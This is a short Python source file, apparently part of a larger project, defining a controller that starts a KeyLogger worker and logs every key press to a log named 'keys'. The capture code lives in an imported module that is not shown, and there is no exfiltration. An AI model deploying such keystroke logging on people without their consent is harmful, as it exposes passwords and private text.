from ..core.components import KeyLogger


class KeyLoggerController:
    def __init__(self):
        self.worker = KeyLogger()
        self.worker.KEY_PRESSED.connect(self, "onKeyPress")
        self.worker.initLogger("keys")

    def startWorker(self):
        self.worker.start()

    def onKeyPress(self, key):
        self.worker.log(key)
